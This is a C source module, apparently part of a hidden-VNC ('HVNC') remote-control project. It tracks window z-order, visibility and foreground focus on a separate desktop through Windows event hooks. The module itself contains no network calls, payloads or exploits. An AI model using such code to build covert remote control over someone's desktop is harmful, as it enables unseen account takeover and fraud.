//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: wnd_watcher.c
// $Revision: 186 $
// $Date: 2014-07-04 19:05:58 +0400 (Пт, 04 июл 2014) $
// description: 
//	windows list tracker (windows manager)

#include "project.h"
#include <oleacc.h>

VOID WW_GetOwner(PVNC_SESSION pSession,Z_ORDER_LIST_ITEM *lpWnd)
{
	HWND hParent   = GetWindow(lpWnd->hWnd,GW_OWNER);
	HWND hTopPopup = GetTopPopupWindow(&pSession->Desktop,hParent);

	if ((hTopPopup) && (hTopPopup == lpWnd->hWnd)){
		lpWnd->lpOwner = WW_GetWndFromList(pSession,hParent);
	}

	return;
}

PZ_ORDER_LIST_ITEM WW_GetWndFromList(IN PVNC_SESSION pSession,IN HWND hWnd)
{
	PZ_ORDER_LIST_ITEM lpWnd = pSession->Desktop.WndWatcher.lpZOrderList;
	while (lpWnd)
	{
		if (lpWnd->hWnd == hWnd){
			return lpWnd;
		}
		lpWnd=lpWnd->lpNext;
	}
	return NULL;
}

VOID WW_IsWindowOverlapped(PVNC_SESSION pSession, PZ_ORDER_LIST_ITEM lpWnd )
{
	PZ_ORDER_LIST_ITEM lpNext = lpWnd->lpNext;
	BOOL bOverlapped = FALSE;
	RECT rcCurWnd = lpWnd->rect;
	while (lpNext)
	{
		if ((IsWindowVisibleEx(lpNext->hWnd)) && (!IsIconic(lpNext->hWnd)))
		{
			if ((rcCurWnd.left >= lpNext->rect.left) && (rcCurWnd.bottom <= lpNext->rect.bottom) &&
				(rcCurWnd.right <= lpNext->rect.right) && (rcCurWnd.top >= lpNext->rect.top))
			{
				if (((lpWnd->bTopMost) && (lpNext->bTopMost)) || (!lpWnd->bTopMost))
				{
					bOverlapped = TRUE;
					break;
				}
			}
			if (IsFullScreen(pSession,lpNext->hWnd))
			{
				lpNext->bTopMost = TRUE;
				bOverlapped      = TRUE;
				break;
			}
		}
		lpNext=lpNext->lpNext;
	}
	lpWnd->bOverlapped=bOverlapped;
	return;
}

HWND WW_WindowFromPointEx( PVNC_SESSION pSession, POINT pt, HWND *lphParent )
{
	HWND hWnd,hChild;
	PZ_ORDER_LIST_ITEM lpWnd;

	if ( ( pSession->Desktop.dwFlags &  HVNC_NO_WNDHOOK ) != HVNC_NO_WNDHOOK )
	{
		hWnd = 
			ChildWindowFromPointEx(
				pSession->Desktop.hDeskWnd,
				pt,
				CWP_SKIPDISABLED+CWP_SKIPINVISIBLE+CWP_SKIPTRANSPARENT
				);

		WW_LockWndList(pSession);
		lpWnd = WW_GetWndFromList(pSession,hWnd);
		if (lpWnd)
		{
			BOOL bTopMost = lpWnd->bTopMost;
			while ( lpWnd = lpWnd->lpNext )
			{
				if ((!lpWnd->bHidden) && 
					(!lpWnd->bOverlapped) && 
					(lpWnd->bTopMost >= bTopMost) && 
					(!(GetWindowClassFlags(&pSession->Desktop,lpWnd->hWnd) & WCF_PAINT_ALWAYS_BOTTOM)) &&
					(!(lpWnd->Style & WS_CHILD)))
				{
					if (PtInRect(&lpWnd->rect,pt)){
						hWnd = lpWnd->hWnd;
					}
				}
			}
		}
		WW_UnlockWndList(pSession);

		//save top parent
		if ( lphParent ){
			//*lphParent = GetAncestor(hWnd,GA_PARENT);//hWnd;
			*lphParent = hWnd;
		}
		hWnd=_GetBestChild( hWnd, pt );
		//hWnd=GetBestChild( hWnd, pt );

	}else{
		hWnd = WindowFromPoint( pt );
		if ( lphParent ){
			HWND hParent = GetAncestor(hWnd,GA_ROOT);
			if ( hParent == NULL ) hParent = hWnd;
			*lphParent = hParent;
		}

		if ( hWnd == pSession->Desktop.hTrayWnd ){
			WINDOWINFO wiInfo;
			wiInfo.cbSize=sizeof(WINDOWINFO);
			if ( GetWindowInfo(pSession->Desktop.hStartBtnWnd,&wiInfo) )
			{
				if (PtInRect(&wiInfo.rcWindow,pt)){
					hWnd = pSession->Desktop.hStartBtnWnd;
				}
			}
		}else{
			while ( hWnd ){
				hChild = GetBestChildEx( hWnd, pt );
				//hChild = ChildWindowFromPointEx(hWnd,pt,CWP_SKIPDISABLED|CWP_SKIPINVISIBLE|CWP_SKIPTRANSPARENT);
				//hChild = RealChildWindowFromPoint(hWnd,pt);
				if ( hChild == NULL || hChild == hWnd ){
					break;
				}
				hWnd = hChild;
			}
		}
	}
	return hWnd;
}


//
// adds window to z-order list
// note: it doesn't hold lock
//
PZ_ORDER_LIST_ITEM 
	WW_AppendWndToList(
		IN PVNC_SESSION pSession, 
		IN HWND hWnd
		)
{
	PZ_ORDER_LIST_ITEM lpWnd = 0;
	WINDOWINFO wiInfo;

	if (( IsWindow(hWnd) || (IsWindowEx(&pSession->Desktop,hWnd))) && 
		(!(GetWindowClassFlags(&pSession->Desktop,hWnd) & WCF_PAINTMETHOD_NOP)))
	{
		if ( !pSession->Desktop.WndWatcher.lpZOrderList ){
			lpWnd = pSession->Desktop.WndWatcher.lpZOrderList=
				(PZ_ORDER_LIST_ITEM)hAlloc(sizeof(Z_ORDER_LIST_ITEM));
			memset(lpWnd,0,sizeof(Z_ORDER_LIST_ITEM));
		}
		else
		{
			PZ_ORDER_LIST_ITEM lpPrev;
			lpWnd = pSession->Desktop.WndWatcher.lpZOrderList;
			while ( lpWnd )
			{
				if (lpWnd->hWnd == hWnd){
					return lpWnd;
				}
				lpPrev=lpWnd;
				lpWnd=lpWnd->lpNext;
			}
			lpWnd=lpPrev->lpNext=(PZ_ORDER_LIST_ITEM)hAlloc(sizeof(Z_ORDER_LIST_ITEM));

			memset(lpWnd,0,sizeof(Z_ORDER_LIST_ITEM));
			lpWnd->lpPrev=lpPrev;
		}
		
		wiInfo.cbSize=sizeof(WINDOWINFO);
		lpWnd->hWnd = hWnd;
		GetWindowInfo(hWnd,&wiInfo);

		lpWnd->bAltTabItem = IsAltTabItem(&wiInfo);
		lpWnd->Style = wiInfo.dwStyle;
		memcpy(&lpWnd->rect,&wiInfo.rcWindow,sizeof(wiInfo.rcWindow));
		WW_GetOwner ( pSession, lpWnd );
	}
	return lpWnd;
}

//
// removes window from z-order list
// note: it doesn't hold lock
//
BOOL WW_DeleteWndFromList(IN PVNC_SESSION pSession,HWND hWnd, BOOL Update )
{
	PZ_ORDER_LIST_ITEM lpWnd;
	BOOL bUnlock = TRUE;
	BOOL fbResult = FALSE;

	lpWnd = WW_GetWndFromList( pSession, hWnd );
	if (lpWnd)
	{
		PZ_ORDER_LIST_ITEM lpPrev = lpWnd->lpPrev;
		PZ_ORDER_LIST_ITEM lpNext = lpWnd->lpNext;

		fbResult = TRUE;

		if (lpPrev){
			lpPrev->lpNext=lpNext;
		}
		else {
			pSession->Desktop.WndWatcher.lpZOrderList = lpNext;
		}

		if (lpNext) {
			lpNext->lpPrev = lpPrev;
		}
		else
		{
			PZ_ORDER_LIST_ITEM lpItem = lpPrev;
			HWND hPrevWnd = NULL;
			while (lpItem)
			{
				hWnd=lpItem->hWnd;
				if ((IsWindowEx(&pSession->Desktop,hWnd)) && 
					(CheckWindowStyle(hWnd)) && 
					(!(GetWindowClassFlags(&pSession->Desktop,hWnd) & (WCF_NO_CAPTURE|WCF_PAINT_ALWAYS_BOTTOM|WCF_PAINTMETHOD_NOP))))
				{
					hPrevWnd = hWnd;
					break;
				}
				lpItem=lpItem->lpPrev;
			}

			if (hPrevWnd && Update ){
				SetForegroundWnd( pSession, hPrevWnd );
			}
		}
		hFree(lpWnd);
	}
	return fbResult;
}
//
// moves windows to foreground
//
VOID WW_SetFrgWnd(PVNC_SESSION pSession, HWND hWnd, BOOL bLock )
{
	PZ_ORDER_LIST_ITEM lpWnd,lpPrevFrg;
	if ((pSession->Desktop.dwFlags & HVNC_NO_WINDOWS_MANIPULATION_TRICK) || 
		(SS_GET_FOREGROUND_WND(pSession) == hWnd))
	{
		return;
	}

	#if _DEBUG
	{
		CHAR szClass[128] = "";
		CHAR szText[128] = "";
		RECT Rect;
		GetClassNameA(hWnd,szClass,sizeof(szClass));
		GetWindowTextA(hWnd,szText,sizeof(szText));
		GetWindowRect(hWnd,&Rect);
		DbgPrint("hWnd = %p class=%s text=%s %i-%i-%i-%i\n",
			hWnd,
			szClass,szText,
			Rect.top,Rect.left,Rect.right-Rect.left,Rect.bottom-Rect.top
			);
	}
	#endif

	if ( bLock ){
		WW_LockWndList(pSession);
	}
	
	if ((CheckWindowStyle(hWnd)) && 
		(!(GetWindowClassFlags(&pSession->Desktop,hWnd) & (WCF_NO_CAPTURE|WCF_PAINT_ALWAYS_BOTTOM|WCF_PAINTMETHOD_NOP))) && 
		(lpWnd = WW_GetWndFromList(pSession,hWnd)) && 
		(lpWnd->lpNext))
	{
		if (lpWnd->lpOwner){
			WW_SetFrgWnd(pSession,lpWnd->lpOwner->hWnd,FALSE);
		}

		lpPrevFrg = pSession->Desktop.WndWatcher.lpZOrderList;
		while (lpPrevFrg->lpNext){
			lpPrevFrg=lpPrevFrg->lpNext;
		}
		if (lpWnd != lpPrevFrg)
		{
			PZ_ORDER_LIST_ITEM lpPrev=lpWnd->lpPrev;
			PZ_ORDER_LIST_ITEM lpNext=lpWnd->lpNext;

			if (lpNext){
				lpNext->lpPrev=lpPrev;
			}

			if (lpPrev){
				lpPrev->lpNext=lpNext;
			}
			else{
				pSession->Desktop.WndWatcher.lpZOrderList = lpNext;
			}

			lpPrevFrg->lpNext=lpWnd;
			lpWnd->lpPrev=lpPrevFrg;
			lpWnd->lpNext=NULL;
		}
	}

	if ( bLock ){
		WW_UnlockWndList(pSession);
	}
	return;
}

//
// updates z-order
//
VOID WW_RefreshList( PVNC_SESSION pSession )
{
	PZ_ORDER_LIST_ITEM lpWnd;

	WW_SetFrgWnd(pSession, SS_GET_FOREGROUND_WND(pSession), FALSE );
	lpWnd = pSession->Desktop.WndWatcher.lpZOrderList;

	while (lpWnd)
	{
		HWND hWnd;
		WINDOWINFO wiInfo;

		WW_GetOwner( pSession, lpWnd );
		
		wiInfo.cbSize=sizeof(WINDOWINFO);
		hWnd=lpWnd->hWnd;
		if ((IsWindowEx(&pSession->Desktop,hWnd)) && (GetWindowInfo(hWnd,&wiInfo)))
		{
			lpWnd->bTopMost=((wiInfo.dwExStyle & WS_EX_TOPMOST) != 0);
			if (!lpWnd->bTopMost)
			{
				lpWnd->bTopMost=((GetWindowClassFlags(&pSession->Desktop,hWnd) & WCF_PAINT_ON_TOP) != 0);
				if (!lpWnd->bTopMost){
					lpWnd->bTopMost=(((wiInfo.dwExStyle & WS_EX_TOOLWINDOW) != 0) && (wiInfo.dwStyle & WS_CHILD));
				}
				if (!lpWnd->bTopMost){
					lpWnd->bTopMost=IsFullScreen(pSession, lpWnd->hWnd);
				}
			}
			else{
				lpWnd->bTopMost = 
					((GetWindowClassFlags(&pSession->Desktop,hWnd) & WCF_PAINT_ALWAYS_BOTTOM) == 0);
			}

			memcpy(&lpWnd->rect,&wiInfo.rcWindow,sizeof(wiInfo.rcWindow));
			WW_IsWindowOverlapped(pSession,lpWnd);
			lpWnd->bHidden     = (IsWindowVisibleEx(hWnd) == FALSE);
			lpWnd->bAltTabItem = IsAltTabItem(&wiInfo);

			lpWnd=lpWnd->lpNext;
		}
		else
		{
			WW_DeleteWndFromList( pSession, hWnd, FALSE );
			lpWnd = pSession->Desktop.WndWatcher.lpZOrderList;
		}
	}
	return;
}


BOOL _WW_LookupFN( IN PVNC_SESSION pSession, HWINEVENTHOOK hHook )
{
	return
		((pSession->Desktop.WndWatcher.hHook1 == hHook) || 
		 (pSession->Desktop.WndWatcher.hHook2 == hHook) || 
		 (pSession->Desktop.WndWatcher.hHook3 == hHook));
}

PVNC_SESSION _WW_Hook2Session( HWINEVENTHOOK hHook )
{
	return
		VncSessionLookup( 
			(PVNC_COMPARE_FUNC)_WW_LookupFN, 
			(PVOID)hHook 
			);
}

BOOL WW_IsWndPresent ( PVNC_SESSION pSession,HWND hWnd )
{
	BOOL bRet = FALSE;
	while ( hWnd = GetParent(hWnd) )
	{
		bRet= ( WW_GetWndFromList(pSession,hWnd) != NULL );
		if (bRet)
			break;
	}
	return bRet;
}

BOOL WW_IsItMsgBox(PVNC_SESSION pSession,HWND hWnd)
{
	BOOL bRet = FALSE;
	if ((pSession->Desktop.WndWatcher.bMessageBoxIsShown) && 
		(!(pSession->Desktop.dwFlags & HVNC_NO_WINDOWS_MANIPULATION_TRICK)))
	{
		if (GetClassHash(hWnd) == 0x1BA347CA) ///"#32770"
		{
			CHAR szTitle[200];
			GetWindowTextA(hWnd,szTitle,_countof(szTitle));
			if (!lstrcmpA(szTitle,HVNC_MSG_TITLE))
				bRet=TRUE;
		}
	}
	return bRet;
}

VOID CALLBACK 
	WW_HandleWndEvent(
		IN HWINEVENTHOOK hHook,
		IN DWORD dwEvent,
		IN HWND hWnd,
		IN LONG idObject,
		IN LONG idChild,
		IN DWORD dwEventThread,
		IN DWORD dwmsEventTime
		)
{
	PVNC_SESSION pSession = _WW_Hook2Session( hHook );
	Z_ORDER_LIST_ITEM *lpItem=0;
	BOOL fbRefreshList = TRUE;

	if ( pSession == NULL ){
		return;
	}
	
	// terminate
	if (WaitForSingleObject( pSession->SharedSection.hStatusEvent,0) != WAIT_TIMEOUT ){
		WW_Shutdown( pSession );
		return;
	}

	if ((idObject != OBJID_WINDOW) || 
		(!hWnd) || 
		(GetWindowClassFlags(&pSession->Desktop,hWnd) & WCF_IGNOREWINDOW))
	{
		return;
	}

	switch (dwEvent)
	{
	case EVENT_OBJECT_CREATE:
		{
			if ( !WW_IsItMsgBox(pSession,hWnd) )
			{
				WW_LockWndList(pSession);
				lpItem = WW_AppendWndToList(pSession,hWnd);
				WW_UnlockWndList(pSession);
			}
			fbRefreshList = FALSE;
			break;
		}
	case EVENT_OBJECT_HIDE:
		{
			BOOL bUnlock = TRUE;
			BOOL bVisible;

			DbgPrint("EVENT_OBJECT_HIDE hWnd = %p \n",hWnd);

			bVisible = IsWindowVisible(hWnd);
			if ( !bVisible ){
				fbRefreshList = FALSE;
				break; //already hidden
			}

			WW_LockWndList(pSession);
			lpItem = WW_GetWndFromList(pSession,hWnd);
			if ( lpItem == NULL ){
				fbRefreshList = FALSE;
				WW_UnlockWndList(pSession);
				break;
			}

			if ( lpItem->bHidden == FALSE )
			{
				lpItem->bHidden = TRUE;
				if ( lpItem->lpNext == NULL )
				{
					PZ_ORDER_LIST_ITEM lpWnd = lpItem;
					while ( lpWnd )
					{
						hWnd = lpWnd->hWnd;
						if ((IsWindowEx( &pSession->Desktop, hWnd )) && 
							(CheckWindowStyle(hWnd)) && 
							(!(GetWindowClassFlags(&pSession->Desktop,hWnd) & (WCF_NO_CAPTURE|WCF_PAINT_ALWAYS_BOTTOM|WCF_PAINTMETHOD_NOP))))
						{
							WW_UnlockWndList(pSession);
							bUnlock = FALSE;

							SetForegroundWnd(pSession,hWnd);
							break;
						}
						lpWnd=lpWnd->lpPrev;
					}
				}
			}
			if ( bUnlock ){
				WW_UnlockWndList(pSession);
			}
			break;
		}
		break;
	case EVENT_OBJECT_SHOW:
		{
			BOOL bHidden,bTopMost,bAltTabItem;
			BOOL bVisible;

			DbgPrint("EVENT_OBJECT_SHOW hWnd = %p \n", hWnd);

			bVisible = IsWindowVisible(hWnd);
			if ( bVisible ){
				fbRefreshList = FALSE; //already visible
				break;
			}

			WW_LockWndList(pSession);
			lpItem = WW_GetWndFromList(pSession,hWnd);
			if ( lpItem == NULL ){
				fbRefreshList = FALSE;
				WW_UnlockWndList(pSession);
				break;
			}
			bHidden = lpItem->bHidden;
			bTopMost = lpItem->bTopMost;
			bAltTabItem = lpItem->bAltTabItem;

			if ( lpItem->bHidden ){
				lpItem->bHidden = FALSE;
			}
			WW_UnlockWndList(pSession);

			if ( bHidden )
			{
				if ( bTopMost )
				{
					if ( bAltTabItem ){
						SetForegroundWnd(pSession,hWnd);
					}
					else {
						WW_SetFrgWnd(pSession,hWnd,TRUE);
					}
				}
			}
			break;
		}
	case EVENT_OBJECT_DESTROY:
		{
			WW_LockWndList(pSession);
			fbRefreshList = WW_DeleteWndFromList(pSession,hWnd,TRUE);
			WW_UnlockWndList(pSession);

			//fbRefreshList = FALSE;
			break;
		}
	case EVENT_OBJECT_LOCATIONCHANGE:
		{
			WINDOWINFO wiInfo;

			wiInfo.cbSize=sizeof(WINDOWINFO);
			GetWindowInfo(hWnd,&wiInfo);

			WW_LockWndList(pSession);
			lpItem = WW_GetWndFromList(pSession,hWnd);
			if ( lpItem ) {
				memcpy(&lpItem->rect,&wiInfo.rcWindow,sizeof(wiInfo.rcWindow));
			}else{
				fbRefreshList = FALSE;
			}
			WW_UnlockWndList(pSession);
			break;
		}
	case EVENT_SYSTEM_FOREGROUND:
		{
			if (!WW_IsItMsgBox(pSession,hWnd))
			{
				if (!(GetWindowClassFlags(&pSession->Desktop,hWnd) & WCF_MENU))
				{
					WW_SetFrgWnd ( pSession, hWnd, TRUE );
					SS_SET_FOREGROUND_WND(pSession, hWnd);
				}
			}
			break;
		}
	default:
		fbRefreshList = FALSE;
		break;
	}

	if ( fbRefreshList ){
		WW_LockWndList(pSession);
		WW_RefreshList( pSession );
		WW_UnlockWndList(pSession);
	}
	return;
}

VOID WINAPI WW_Thread ( PVNC_SESSION pSession )
{
	SetThreadDesktop(pSession->Desktop.hDesktop);
	pSession->Desktop.WndWatcher.bWatcherStarted=TRUE;

	if ( ( pSession->Desktop.dwFlags &  HVNC_NO_WNDHOOK ) != HVNC_NO_WNDHOOK )
	{
		CoInitialize(NULL);
		pSession->Desktop.WndWatcher.hHook1=
			SetWinEventHook(
				EVENT_OBJECT_CREATE,
				EVENT_OBJECT_HIDE,
				NULL,
				WW_HandleWndEvent,
				0,0,WINEVENT_OUTOFCONTEXT
				);
		pSession->Desktop.WndWatcher.hHook2=
			SetWinEventHook(
				EVENT_OBJECT_LOCATIONCHANGE,
				EVENT_OBJECT_LOCATIONCHANGE,
				NULL,
				WW_HandleWndEvent,
				0,0,WINEVENT_OUTOFCONTEXT
				);
		pSession->Desktop.WndWatcher.hHook3=
			SetWinEventHook(
				EVENT_SYSTEM_FOREGROUND,
				EVENT_SYSTEM_FOREGROUND,
				NULL,
				WW_HandleWndEvent,
				0,0,WINEVENT_OUTOFCONTEXT
				);
	}

	// signal that we are ready
	SetEvent( pSession->Desktop.WndWatcher.hStartEvent );

	while ( WaitForSingleObject(pSession->SharedSection.hStatusEvent,0) == WAIT_TIMEOUT )
	{
		MSG msg;
		if (!GetMessage(&msg,NULL,0,0))
			break;
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	WW_Shutdown(pSession);

	if ( ( pSession->Desktop.dwFlags &  HVNC_NO_WNDHOOK ) != HVNC_NO_WNDHOOK )
	{
		CoUninitialize();

		WW_LockWndList(pSession);
		if ( pSession->Desktop.WndWatcher.lpZOrderList )
		{
			PZ_ORDER_LIST_ITEM lpItem=
				pSession->Desktop.WndWatcher.lpZOrderList;
			while (lpItem)
			{
				PZ_ORDER_LIST_ITEM lpPrev=lpItem;
				lpItem=lpItem->lpNext;
				hFree(lpPrev);
			}
			pSession->Desktop.WndWatcher.lpZOrderList = NULL;
		}
		WW_UnlockWndList(pSession);
	}

	return;
}

VOID WW_Shutdown ( PVNC_SESSION pSession )
{
	pSession->Desktop.WndWatcher.bWatcherStarted    = FALSE;
	if ( ( pSession->Desktop.dwFlags &  HVNC_NO_WNDHOOK ) != HVNC_NO_WNDHOOK )
	{
		if ( pSession->Desktop.WndWatcher.hHook1 ){
			UnhookWinEvent(pSession->Desktop.WndWatcher.hHook1);
			pSession->Desktop.WndWatcher.hHook1 = NULL;
		}
		if ( pSession->Desktop.WndWatcher.hHook2 ){
			UnhookWinEvent(pSession->Desktop.WndWatcher.hHook2);
			pSession->Desktop.WndWatcher.hHook2 = NULL;
		}
		if ( pSession->Desktop.WndWatcher.hHook3 ){
			UnhookWinEvent(pSession->Desktop.WndWatcher.hHook3);
			pSession->Desktop.WndWatcher.hHook3 = NULL;
		}
	}
	pSession->Desktop.WndWatcher.bMessageBoxIsShown = FALSE;
	return;
}


DWORD WW_Start ( PVNC_SESSION pSession )
{
	DWORD Error = NO_ERROR;

	if (pSession->Desktop.WndWatcher.bWatcherStarted)
		return NO_ERROR;

	if ( ( pSession->Desktop.dwFlags &  HVNC_NO_WNDHOOK ) != HVNC_NO_WNDHOOK )
	{
		InitializeCriticalSection( &pSession->Desktop.WndWatcher.csWndsList );

		if (!(pSession->Desktop.dwFlags & HVNC_USE_BITBLT))
		{
			HWND hWnd=GetWindow(GetWindow(pSession->Desktop.hDeskWnd,GW_CHILD),GW_HWNDLAST);
			if ( hWnd ){
				do {
					WW_AppendWndToList(pSession,hWnd);
				}while (hWnd=GetWindow(hWnd,GW_HWNDPREV));
			}

			SetForegroundWnd(pSession,pSession->Desktop.hTrayWnd);
		}
	}
	pSession->Desktop.WndWatcher.hStartEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
	if ( pSession->Desktop.WndWatcher.hStartEvent == NULL ){
		return GetLastError();
	}

	pSession->Desktop.WndWatcher.hThread = 
		CreateThread(
			NULL,0,
			(LPTHREAD_START_ROUTINE)WW_Thread,
			pSession,
			0,&pSession->Desktop.WndWatcher.ThreadID
			);

	if ( pSession->Desktop.WndWatcher.hThread == NULL ){
		Error = GetLastError();
		CloseHandle(pSession->Desktop.WndWatcher.hStartEvent);
		pSession->Desktop.WndWatcher.hStartEvent = NULL;
	}else{
		WaitForSingleObject(pSession->Desktop.WndWatcher.hStartEvent,10000);
		CloseHandle(pSession->Desktop.WndWatcher.hStartEvent);
		pSession->Desktop.WndWatcher.hStartEvent = NULL;
	}
	return Error;
}

VOID WW_Stop ( PVNC_SESSION pSession )
{
	
	if ( pSession->Desktop.WndWatcher.hThread ){
		//if ( pSession->Desktop.WndWatcher.bWatcherStarted )
		{
			PostThreadMessage( 
				pSession->Desktop.WndWatcher.ThreadID,
				WM_NULL,0,0
				);
		}
		WaitForSingleObject(pSession->Desktop.WndWatcher.hThread,INFINITE);
		CloseHandle( pSession->Desktop.WndWatcher.hThread );
		pSession->Desktop.WndWatcher.hThread = NULL;
	}

	if ( ( pSession->Desktop.dwFlags &  HVNC_NO_WNDHOOK ) != HVNC_NO_WNDHOOK ){
		DeleteCriticalSection( &pSession->Desktop.WndWatcher.csWndsList );
	}
}


